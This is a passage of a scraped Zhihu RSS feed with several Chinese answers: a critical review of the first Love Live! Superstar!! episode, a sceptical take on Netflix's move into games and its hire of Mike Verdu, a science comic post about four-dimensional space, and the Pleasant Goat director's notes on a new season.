data-private-watermark-src=\"v2-c9369a4b87a46c6db6cabf8d36312fa1\"></p>\n<p>而星团的第一集，则很大程度上扎了一个马扎，狠狠地向着对个体层面的深刻矛盾的展现与解决迈了一大步，单集的开始便是团队leader香音的回忆部分，确实很出色地将香音这个角色从典型的ll系立德的超元气，精神属性超强变成了美洲杯夺冠之前各大足球论坛里面的梅西——天赋满满，人人都觉得肯定能国家队大满贯，但是大赛关键场次软脚虾，精神属性堪忧的非正常LL立德，这个是本单集的第一个亮点，很可能也是本集最让笔者有期待的地方。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-6bb75bb5abc00c14c169dde94b63d41d_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-watermark=\"original\" data-original-src=\"v2-6bb75bb5abc00c14c169dde94b63d41d\" data-watermark-src=\"v2-14fcbaefc69ff16f21be699438e7a02f\" data-private-watermark-src=\"v2-386caa54ff009731f08fe9c8a266e65b\"></p>\n<p>在之后切入到正式时间线里之后，一开始对于香音自己的介怀，对于躺平而绷不住的心态都也很到位，这一种将个人属性与矛盾作为剧情端口的想法我觉得很不错，即使是里面穿插了其他个人的剪影也挺合理，我真的一度感觉按照这样的突破，进一步地发扬虹咲时期对于偶像团体中个人性的调整，其实是一个挺不错比较合理的安排，既有新鲜感，又不算是没有其他类型作品的范式，但是，本作第一集迈出的这样一步也很大程度上在文本量面前扑了街。</p>\n<p>我当然能理解香音这个角色就属于是那种本质上超爱音乐，但是有一个桎梏没过过去，陷入到了的愈加自我否定与对自己精神属性怀疑的情况，到时候指不定比谁都高精神属性的角色；我也知道这种角色确实很可能是最有可能找到一个节点就突破的角色。但是本作在有虹色游击队前三集试图将重建与雪菜个人回结合，然后由于文本量没办法应对同时把重建计划中的群像面与雪菜个人部分讲好，最后把本作的第三集整成了前半程最不行的单集的前车之鉴的情况下，星团居然“百尺竿头更进一步”，直接第一集就一鼓作气就把香音这个疑似PTSD治好了，顺带着还就是唐可可说句鸡汤就走几脚就好了，啊这......</p>\n<p><img src=\"https://pic3.zhimg.com/v2-9581b40a39295e75f54ae6705752ff25_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-watermark=\"original\" data-original-src=\"v2-9581b40a39295e75f54ae6705752ff25\" data-watermark-src=\"v2-803969dfa6960f55d6937e39223f9177\" data-private-watermark-src=\"v2-f8eb324f1e75dae2aaf6930666863d10\"></p>\n<p>于此处有着相当类似性的大概是虹团ep1里面步梦第一次入部纠结之后的台阶特效唱歌，那一段按照我昨天重新过了一遍的感觉来说，就第一集来看也是一样的仓促感，这一点印象中我在评价虹团第一集的想法时也有提到，但是当时毕竟一方面虹团的特效部分确实值得赞赏，另一方面事后诸葛亮的来看，这里只是一个分号，还没有到达爆点，存在的问题也只是犹疑而不是从小到大的PTSD级别怯场。</p>\n<p>从文本对象来看，此处解决的问题其实与爱马仕本家的雪步有着相当的相似程度，且不谈我个人觉得第一次雪步个人回的下乡演出带来的解决方法也不太行，但是人家整个单集的起承转合与几次沟通的情绪与效用，都远比现在第一集的tkk那种真空形象说几句似是而非的话来着更有感觉。而不是像现在星团这样子在第一集单薄的文本量与人物形象之下，以一种过于莫名的情绪来一股劲铆足就克服了，这很不对劲的</p>\n<p><img src=\"https://pic3.zhimg.com/v2-e4c81c01cbf45fb2133f9efe964c3176_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-watermark=\"original\" data-original-src=\"v2-e4c81c01cbf45fb2133f9efe964c3176\" data-watermark-src=\"v2-d722fa63f4c8c4eed93237f04c3a0b9a\" data-private-watermark-src=\"v2-181f28be2ff75a58530523e88061401e\"></p>\n<p>所以从我个人的安排来说，我可能更希望把本集断在香音出门抬头听到tkk练声那里，把之前的沟通进一步扩容和增加情绪，后面再给香音纠结的部分更多篇幅与演出，然后将本集收尾的部分放在下一集中后期。同时我也希望此处的爽朗感不要就这样一下就脱胎换骨，后续不但其他地方可以多玩玩冷面帅逼要素，而且后面在什么正式一点的表演、比赛的时候建议再次因为这个出问题，然后花田大老师给一个比“不要放弃啊”更高级的回答。</p>\n<p><b>不过毕竟这都是商业企划，能骗人进llas就成功（草，千万不要这样啊！）</b></p>\n<h3><b>3.鲤鱼，此刻最大的短板，却不只是她的问题</b></h3>\n<p>不论是鲤鱼粉，鲤鱼黑亦或是摩天轮魔怔人，我们都不得不承认，鲤鱼确实很大程度上让星团的讨论热度远超其企划本身在国内的讨论热度，这一点大约大棋党，国际资本改造人会觉得意义重大，但笔者虽然键政远多于动画，但是现在只想提动画部分。</p>\n<p>从笔者的感受来说，高情商地说，鲤鱼的日语配音除去语速峰值也就只能适应动画配音这种语速，一到大喘气的时候就音色尖锐，对于国内观众来说也没有什么不适感;低情商地说，鲤鱼的中文配音水平不如其日语配音水平。第一段中文配音部分如果还能因为那种腻歪感还能因为过去传言/谣言的部分怀疑音响相关是不是把国语配音等于了台版配音，第二段的配音就能表明鲤鱼的国语配音水平确实真不行以及真没有当成台配，那种急了只是把语速加快到含糊不清，然后中文的语气词还要拖长音的说话方式，真不是国人正常说话方式。反倒是香音那一段“小笼包”居然更加字正腔圆一点。而且从LL企划下的中文直播方面，昨天鲤鱼直播的直播效果，一句话读三次的尴尬感，讲道理在我看来真不如在油管上同样日中混合直播的LLAS里面钟岚珠的CV，在广东读过几年小学的法元明菜应对自然，业务水平嘛，我就只说这么多了。</p>\n<a href=\"https://www.zhihu.com/video/1398717493972819969\">星团唐可可第二段中文配音</a><p>但是，鲤鱼的业务水平部分虽然国人肯定会更敏感，但是唐可可这个角色的微妙感，在我看来鲤鱼也就占两三成比例，就第一集来看，我觉得唐可可最大的微妙在于其定位的尴尬。上一部分我提到，星团的第二个创新就是把leader与宣传机器脱钩，而在这个过程中，确实带来了香音这样一个非典型LL核心，但是在这样的切割之下，第一集的唐可可，除去塑料日语与塑料汉语打架，就只剩下不停地和喜之郎经典广告一样重复着“我想当学园偶像”“你要不要当学园偶像”，属实让人怀疑她家是不是以前是在权健上班的。而且更微妙的问题在于，当立德与宣传者，初始的动议者进行切割之后，综使本集为唐可可安排了开导香音的部分，但是这一部分在第二部分所介绍的微妙感与极度匮乏的文本量下，就很难让我觉得这里确实能开导成功，进而更加加重了笔者对于鲤鱼/唐可可德不配位的怀疑。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-9d258aec23101897a1fc870a085902f7_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-watermark=\"original\" data-original-src=\"v2-9d258aec23101897a1fc870a085902f7\" data-watermark-src=\"v2-861155e8296740955b8a39b40ef6dcdf\" data-private-watermark-src=\"v2-46e24c9c1c1e7b5a23795a3fa55114c2\"></p>\n<p>如果说，唐可可这个形象除去不开口的时候还有什么时候是令我期待的，大约本集中那个唐可可日记里面那一段歌词确实是大亮点</p>\n<p><img src=\"https://pic1.zhimg.com/v2-d17b43b0ecc0bd8ac7c02c18a9aac4b0_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-watermark=\"original\" data-original-src=\"v2-d17b43b0ecc0bd8ac7c02c18a9aac4b0\" data-watermark-src=\"v2-40fbdc93b36d1ca93ee9a028813b3bcc\" data-private-watermark-src=\"v2-349b3f417a04278ce79c242b0ff2e4a8\"></p>\n<p>这一点不只是因为此处歌词确确实实比她那两段配音都要更加标准汉语，更重要的是这里让我还能抱有期待花田有可能在唐可可的中国身份上做文章，而没有彻彻底底把唐可可当成一个套模板的一般路过乐天派狂热工具人，这一点我觉得如果未来有安排唐可可的个人单回，那这里写得好是很有可能能在国内风评方面一举大提升，也是在2018年优秀表现之后花田又一次有机会逆转一下的重要部分。</p>\n<p>最后拿一点小想象来收尾这一部分，唐可可在第一集中一说“自己就是为了当学园偶像来日本的”，我的脑子里一下子想起来几年前在阿批看到的上海地铁的lovelive痛车，想到了拿上海地铁报站音剪的缪斯歌曲的鬼畜，再想了想唐可可的年龄段，或许她就是这样因为小时候在地铁站邂逅了那一班地铁而成为了LLer吧。</p>\n<p>真希望后面唐可可的剧情，能够在对于上海在ACG方面居于国内的特殊性，能够在更加充分地了解中国的前提下，真正的用好混血留学生的设定，把这个角色真正丰满成一个完整的人。</p>\n<h3><b>4.其他与总结</b></h3>\n<p>总的来说，对于本作的第一集，笔者虽然说了五千多字这些东西，看起来也不算是多好的评价，但是笔者也没有觉得第一集多么不行，甚至一定程度上因为人设与美术方面的虹色改造而感觉初见观感非常可以。</p>\n<p>我对本作有不少的担心，也基本上没想过本作能和虹团与田中仁那样能够带来许多不同于lovelive传统的新感受，但大概本作也不至于太糟糕</p>\n<p>至少这一次，“感谢”东京奥运会，喜提工期+3 weeks，大概有可能会让绘柄更稳定点，让化用卡面与游戏的灵活运用之外能够在演出上有不愧于这个企划的成果</p>\n<p><img src=\"https://pic3.zhimg.com/v2-fc33b3a16d8bb00430bb9eaa5556310f_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"690\" data-rawheight=\"1506\" data-watermark=\"original\" data-original-src=\"v2-fc33b3a16d8bb00430bb9eaa5556310f\" data-watermark-src=\"v2-f62b1d3d5d5a99bc1ad77febc9f525c1\" data-private-watermark-src=\"v2-711af401741635a9b54275a9b8f47676\"></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/akode-hong?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">Ako的红</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/471564130/answer/1998229747?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">31 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/29681781?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">《LoveLive!》有什么有意思的二设？</a><br><a href=\"http://www.zhihu.com/question/34555301?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">对于动画宅来说，Love Live! 提供了什么其他动画作品没提供的新感受？</a><br>\n","link":"http://www.zhihu.com/question/471564130/answer/1998229747?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"Netflix 将开发自主游戏平台，已聘请 Facebook 内容副总裁，有哪些行业信息值得关注？","date":"2021-07-16 03:00:08","description":"\n<p>感谢 <a class=\"member_mention\" href=\"http://www.zhihu.com/people/24899f12dd48bb86191ab79febb1668c\" data-hash=\"24899f12dd48bb86191ab79febb1668c\" data-hovercard=\"p$b$24899f12dd48bb86191ab79febb1668c\">@叶佳桐</a> 邀请～</p>\n<p>两个层面。</p>\n<p>（1）业务怎么样。</p>\n<p>（2）人怎么样。</p>\n<p>-</p>\n<p>先说业务。</p>\n<p><b>简单说不看好。</b></p>\n<p>不看好的理由很简单，跟我不看好头条快手谷歌FB做好游戏一样。</p>\n<p><b>主业务与【游戏内容】业务没关系。新开的游戏业务就会成为空降高管，贵价老油子老混子的混饭场所，然后会有些高薪高学历年轻人在这里混废。</b></p>\n<p>为什么，<b>因为没必要。</b> 我自有业务做得很好，转的很好，那么我的精力始终会放在我的核心业务上面。就算我自己确实有扩新业务的压力，我的惰性和有限的注意力也会限制我把这个业务做好的成都。</p>\n<p>-</p>\n<p>为了避免被叶大揍还是多写点。<b>那我们看看Netflix做游戏有什么优劣势。</b></p>\n<p>优势当然是自己做订阅制大大的牛逼，而且在内容管理，内容孵化这块仍然是世界前列，甚至是世界第一。本身企业的执行力也还是够强。</p>\n<p>劣势其实就一点，<b>没做过游戏。</b>本身这不是大问题，但现在全球范围内游戏的竞争也很激烈，这个时候加入战局，引申的问题就很多了。</p>\n<p><b>另外一个问题是Netflix需要回答自己的游戏业务到底做什么。</b></p>\n<p>我在做投资岗的时候最烦的事情就是在notes里面写跟公司的synergy。但始终，Netflix必须要回答，到底为什么我要做游戏业务。</p>\n<p>最简单的推测是，<b>【依托于强IP资源】【做订阅制平台】</b>。这两点可拆，也可以合并。</p>\n<p>如前所述，Netflix在内容管理，内容孵化这块是世界前列。他们手上有非常多的，类型极为丰富的，高质量的IP。像是《纸牌屋》，《怪奇物语》这样的电视剧IP，或是《爱尔兰人》这类电影IP（我知道这是严肃片但黑帮背景可以做的演绎很多），都是人尽皆知的。</p>\n<p>那么IP资源在手，至少可以做IP游戏。甚至在未来再做一波影游联动。至于游戏授权之类的他们已经在做了，就不提了。</p>\n<p>订阅制平台则是集中自己的订阅制侧技术优势，做一个月付或年付的游戏平台——因为Netflix这个名头还是跟订阅制联系在一起。</p>\n<p>其实这么看来风险还是存在且显著的。</p>\n<p>做IP游戏，<b>能不能搞到好的制作团队，做出好的产品是重点。</b>话又说回来，谷歌搞了Jade Raymond为首的一大批北美3A人，也没见做出什么东西来。</p>\n<p>做订阅制平台，那么你的对手是，XGP。你说XGP太大打不过，来走移动端，那也得跟Apple Arcade或者Google Play Pass打。</p>\n<p><b>恕我直言，拿头打？</b></p>\n<p>而其他游戏公司的发展方向，比如原创自研或者发行，那么Netflix都没有任何优势，失败案例很多。亚马逊12年pi都没做出来一个，或者头条这种做出一堆_____的状态。</p>\n<p><b>恕我直言，拿头做？</b></p>\n<p>当然，毕竟我是住桥洞的，上面的人高瞻远瞩，我不配评价。现在来看，Netflix把FB这哥哥找过来，应该是找到了回答。但这是不是好回答，我们不知道。</p>\n<p>我拿以上举例的四家给出的回答来给大家评价一下：</p>\n<p>头条：<i>我是国内第一渠道，肥水不流外人田。（</i>语出头条游戏某高层）</p>\n<p>快手：<i>我要做全国第一游戏内容平台。</i>（语出近期快手游戏招人po文）</p>\n<p>谷歌：<i>我要拥抱云，做领先的第一方云游戏内容。</i></p>\n<p>FB：<i>我要拥抱虚拟现实，做领先的VR/AR内容。</i></p>\n<p>结果就是，前两家至今没成（别跟我说海贼王），后两家谷歌把内容团队砍了，专注平台；FB一直没声音。</p>\n<p>Netflix能走得更好吗？非常难说。上面几家都不比Netflix缺钱缺人。</p>\n<p>-</p>\n<p>第二个问题，人怎么样。</p>\n<p>Mike Verdu当然不是无名小卒，但他也跟传统意义上的强内容型开发者关系不大。</p>\n<p>这个哥，真的，老。程序员出身，出生是在1964年。第一份可查的工作就是创业，那是在1985年。做了12年码农之后开始去做游戏。</p>\n<p>他最出名的游戏相关经历是在Zynga期间做了Farmville。但那是2009-2012年间的事情。 此外他之前在EA作为制作人和创意总监做了《命令与征服3》以及《魔戒：中土之战2》</p>\n<p>12年离开Zynga之后，Mike Verdu开始创业，做了手游公司Tapzen，拿了腾讯的钱，被Kabam收购。收购之后就一直在当职业经理人。Kabam呆了两年，充当首席创意官，然后回到了EA管手游，治下做了一堆抽卡产品，商业化最好的是IP作品《星战：银河英雄》。19年去FB，管Oculus的内容，结果其实也没有太多能说的。</p>\n<p><b>总而言之这个哥是一个老资格开发者，本身对游戏行业应该是有认知。</b></p>\n<p><b>但是近10年，Mike老哥的成绩其实乏善可陈。他这个经历和年龄，也不是很有战斗力的样子，看起来也是去Netflix爽拿美元的。</b></p>\n<p>所以不看好。</p>\n<p>如果是IP内容的话，其实周期长，风险大。这样一个人带队，失败率其实是很高的。</p>\n<p>而比较麻烦的点是从经历看这个哥没做过发行，所以要是做平台那很难说。</p>\n<p>-</p>\n<p>我觉得还是要找准自己在世界上的位置，真的。</p>\n<p>不在其位不谋其利嘛。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/question/472406428/answer/2000722590?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\">知乎用户（登录查看详情）</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/472406428/answer/2000722590?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">16 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/21286718?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">Facebook 涉足游戏发行领域有什么优势？</a><br><a href=\"http://www.zhihu.com/question/52311919?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">在facebook未成气候时，腾讯为啥不及时进军美国，腾讯比facebook成立要早啊？</a><br>\n","link":"http://www.zhihu.com/question/472406428/answer/2000722590?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如何用科普动画、漫画的形式进行科学传播？","date":"2021-07-15 15:30:07","description":"\n<p>作品名：四维人看的漫画是啥样的？   作品类别：关于四维空间的脑洞   作者：ZCloud</p>\n<p><img src=\"https://pic2.zhimg.com/v2-b0aed3b33937d1f64c4b063a03ac5e05_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"4628\" data-watermark=\"watermark\" data-original-src=\"v2-b0aed3b33937d1f64c4b063a03ac5e05\" data-watermark-src=\"v2-1150dd922e3371284864d2cf8076fae4\" data-private-watermark-src=\"v2-1206b028572a58a6777494214996b75f\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-68510626a218630199722ccdf91a1f27_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"7122\" data-watermark=\"watermark\" data-original-src=\"v2-68510626a218630199722ccdf91a1f27\" data-watermark-src=\"v2-e175470c088c2e9b7c57dc22b7195c46\" data-private-watermark-src=\"v2-2f770fe8f8001d60b651e82a32ac8161\"></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/zcloud1985?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">ZCloud</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/472178904/answer/2000086901?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">14 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/357158336?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何引导父母一起看动画和漫画？</a><br><a href=\"http://www.zhihu.com/question/332956635?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">求推荐一些好看不火的动画或者漫画?</a><br>\n","link":"http://www.zhihu.com/question/472178904/answer/2000086901?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如何评价7月播出的《喜羊羊与灰太狼之决战次时代》？","date":"2021-07-15 11:30:07","description":"\n<p>      大家好，我是《喜羊羊与灰太狼》总导演黄伟明。又到暑假，喜羊羊的新系列如约而至，这次推出的《决战次时代》，羊羊们将去到未来的“次时代”冒险，给大家呈现不一样的羊村和羊狼角色！感谢大家的支持与厚爱，《决战次时代》播出4天芒果TV点击率破亿，登上优酷全站热搜和少儿榜单热度第一，羊羊团队会继续努力做好内容来回馈大家的支持！</p>\n<h3><b>《喜羊羊与灰太狼》十六周年</b></h3>\n<h3><b>送给你我的一场成年礼：未来的你也可以成为自己最喜欢的样子</b></h3>\n<p>     《决战次时代》是一个和时空有关的故事，讲述了喜羊羊与灰太狼意外来到十五年后的此事后，为了重塑历史，回到自己的时空，与其他长大后的小羊们齐心收集能源石碎片，守护家园的故事.《羊村守护者》系列已经来到第四季了，什么样的题材才能不断给观众不一样的惊喜是创作团队一直在思考的事情。怎样去避免故事模式化，“突破羊守系列的传统，给观众带来点惊喜！”，于是团队一致决定，这一次跨时空之旅要做一场“成人礼”！把《决战次时代》定位在：成长与未来。小羊们一改趣萌可爱的小羊形象，加上城市化、科技化的场景元素，打开了大家对羊守系列乃至《喜羊羊与灰太狼》世界观的全新想象。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-cf2e49aadb8f873dfed2cd860e7f5f2c_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-cf2e49aadb8f873dfed2cd860e7f5f2c\" data-watermark-src=\"v2-92225664d8d07e48cb4c2dece196bcba\" data-private-watermark-src=\"v2-9237c4f2e6e3dc86f1806ccfcaf0bc4a\"></p>\n<p>    为什么说是“成人礼”？今年是《喜羊羊与灰太狼》的16周年，羊狼们的形象一直深入人心，年纪虽小但却勇敢正义守护家园，一直陪伴大家的成长，大家对小羊们“多大了”这个问题也一直充满兴趣，十五年过去了，小羊们是时候长大了！因此，创作团队就决定：让大家见证一下十五年后，走上社会的小羊和大家见面，一起守护十五年后的家园。这一次无论是在动画世界里还是我们故事创作，动画制作上都是一次很大的尝试和挑战。      </p>\n<p>   比如长大后的小羊形象，在创作初期，我们构想设计过许多小羊长大后形象，那究竟怎样才符合长大后的他们呢？才能做出合理的变化？<b>在我看来，作为家喻户晓的国民动画IP，我们角色形象的突破要建立在角色固有的DNA上，不能纯粹为了“博眼球”而变。一方面要有新鲜度和惊喜感，另一方面也要保持角色积累十五年来的原始设定。</b>在几番讨论过后，我们决定以梦想和职业为切入点：从“大肥羊学校”到进入“次时代社会”这必然是一个飞越的改变，有了职业身份的变化就能合理化地去塑造新的形象。而职业的设定我们也是顺延他们小时候的想法，从它们从小的品格特点延展和发挥开来的，比如暖羊羊当上了形象转变十分大的歌星是因为她喜欢唱歌，喜欢歌星扁嘴伦，一直想成为勇敢自信的自己，所以从默默付出到登上舞台，自信健康的暖羊羊成为了本次角色形象中改变最大的一只羊。   </p>\n<p><img src=\"https://pic4.zhimg.com/v2-b43145848f14497ed10d9cecffde0bbb_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1191\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-b43145848f14497ed10d9cecffde0bbb\" data-watermark-src=\"v2-978be4e58259a1f45385cb25ac92661c\" data-private-watermark-src=\"v2-d4f4c0c05dd976da17468475aa29bf5a\"></p>\n<p>    同时，我觉得童年的梦是美好的，也是最难以坚持的，所以我们还想借小羊们长大后实现梦想来让大家知道：心中的种子可以发芽开花结果，你也可以成为你自己喜欢的样子。只要努力追求，坚持热爱，梦想成真，理想实现并不只是童话而已！所以，<b>我觉得长大后的他们应该是他们从小向往，努力奔赴的样子，是观众们一直期盼的样子。  </b></p>\n<p><img src=\"https://pic2.zhimg.com/v2-e9e25949d3d86f9f26f4d3b70824c827_720w.jpeg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1191\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-e9e25949d3d86f9f26f4d3b70824c827\" data-watermark-src=\"v2-14961783441e0b7f76605e60cd4ee7e9\" data-private-watermark-src=\"v2-d8334910ac80bfc8dab39a09ef48235b\"></p>\n<h3><b>适当的留白，让角色的未来充满无限可能</b></h3>\n<p>     我看到有些观众在问：为什么没有设定喜羊羊长大呢？喜羊羊的成长有些许不同的，他有经历过不同时期，性格也有发生不同的转变，比起其他小羊，喜羊羊更加多面，因此每个人心里留下的，喜欢的喜羊羊都是不一样的，也许有人认为他调皮淘气可爱，认为他成熟懂事，未来他会上太空还是留在草原守护家园，大家对他的期望和想象都很广很大，<b>所以我们并不想就此框定了所有羊狼，在塑造角色的过程中给观众留下一个空白，</b>借用主角视角来开启这一场时代之旅，让大家代入到喜羊羊的角色去看其他同伴的成长变化，然后<b>去想象未来的自己</b>。这一次时代之旅过后，相信大家心里也有了自己的“次时代喜羊羊”了吧？喜羊羊也会有属于他的光明未来，至于长大后的他会是什么样呢？就留给大家想象啦！</p>\n<p><img src=\"https://pic4.zhimg.com/v2-9540ba08f3c33e58241019ac0b25b592_720w.gif?rss\" data-rawwidth=\"717\" data-rawheight=\"420\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-9540ba08f3c33e58241019ac0b25b592\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<h3><b>与角色一同呼吸一同成长，在细节中挖掘故事深度</b></h3>\n<p>     从《决战次时代》首播到现在，大家最关切的一看点莫过于灰太狼和小灰灰的亲情羁绊，也是我们着力刻画的情感点，过程中也有过担心忧虑：昔日亲情浓厚的狼堡父子变得冷漠仇恨是否会让观众不习惯？但矛盾和失去是我们成长过程中必经阶段，经得起风雨的感情才令人倍感珍惜，将更加浓烈。实际上，小灰灰也并不是真正讨厌，不在意灰太狼，只是太爱爸爸而无法接受他离去的十五年，在沟通，互吐心声后的两父子就释怀了，从而一同并肩作战守护家园。希望通过故事传达出珍惜当下，父母们和孩子之间更多陪伴与沟通，关注孩子的成长，培养孩子优良的品质，父母和孩子一起进步。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-eabce0cf9f590bb49386feed50d039fe_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-eabce0cf9f590bb49386feed50d039fe\" data-watermark-src=\"v2-8c026c0927c1bea3427e65b47e68f47f\" data-private-watermark-src=\"v2-ecdc1960a78135abbe280ab0e2c0d7d4\"></p>\n<p>     除了父子情感线外，羊羊们和机器人反派之间也铺满了细节伏笔，细心的观众能从中发现不少彩蛋和线索，可能是一个镜头，一句不起眼的台词，都有精心设计，大家可以一起在剧中去挖掘和发现。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-bee409e1867b5f15623526aeace1e957_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1191\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-bee409e1867b5f15623526aeace1e957\" data-watermark-src=\"v2-05de8057b4ae1a5fef465a5b0539e970\" data-private-watermark-src=\"v2-2a5fcecd244bb70b6534d078306c2540\"></p>\n<h3><b>突破创新，不忘初心：经典角色相继露面上演“回忆杀”！</b></h3>\n<p>   《决战次时代》是一次全新的创作突破，也是经典的回归，我们向前出发，但坚持初心。那些陪伴了大家十五年的经典角色也会在剧里相继露面，比如15年前那只爱吃香蕉的蕉太狼，抢戏的草原三恶霸，路人王小飞机等等，还有大电影里深受大家喜爱的动人歌曲《星光下的梦想》和《知己》也会在本剧里有“重头戏”，相信这些熟悉的身影和声音都会勾起观众们对喜灰十五年经典时刻的回忆。大家可以在观看的过程中多注意，找找我们藏下的小彩蛋。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-6df1b905de26dd199037eccccaeb3f36_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1191\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-6df1b905de26dd199037eccccaeb3f36\" data-watermark-src=\"v2-6f3d77f463c7a23c8a40a250172bd169\" data-private-watermark-src=\"v2-d60473f79d1c264e2b12db639ee12c82\"></p>\n<h3><b>打破次元壁，借动漫之力传播城市文化</b></h3>\n<p>     创作来源于生活，这次《决战次时代》的主场景来到了繁华的现代化科技城市，团队在场景设计上也下足了功夫。作为土生土长在“羊城”广州的动漫IP，很多设计师在广州生活多年,设计师们将他们的生活“日常场景”还原到作品设计中，让动画场景看上去更接地气，有生活感和真实感。同时，通过动画片传播城市文明和文化魅力。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-3d3ab494ad48a14dc548eba357e2a7c6_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1191\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-3d3ab494ad48a14dc548eba357e2a7c6\" data-watermark-src=\"v2-19916679a22a20f713928f5201efedc0\" data-private-watermark-src=\"v2-6fd67d18446164f1e35bd67a277b13ff\"></p>\n<h3>\n<b>羊羊的长大代表完结？喜灰小时候的故事还会继续吗？</b> </h3>\n<p>     次时代只是羊狼故事里的其中一段旅程，是对未来的展望，是新的开始，而不是结束。无论过去十五年还是以后的更多个十五年，变的是不断前进的脚步，不变的是原创动力团队对大家的感谢和坚持原创的初心！我们的大电影也就在前方，向大家飞奔而来，相信不久之后活力新鲜的羊狼就会在大荧幕跟和大家见面啦！</p>\n<p><img src=\"https://pic4.zhimg.com/v2-0b24debf01ab8cd6a5f889b802fa2eaa_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1191\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-0b24debf01ab8cd6a5f889b802fa2eaa\" data-watermark-src=\"v2-34fb175de9cc90e3803919d702082639\" data-private-watermark-src=\"v2-c10480141fefa9582a82b43adb2f2a05\"></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a 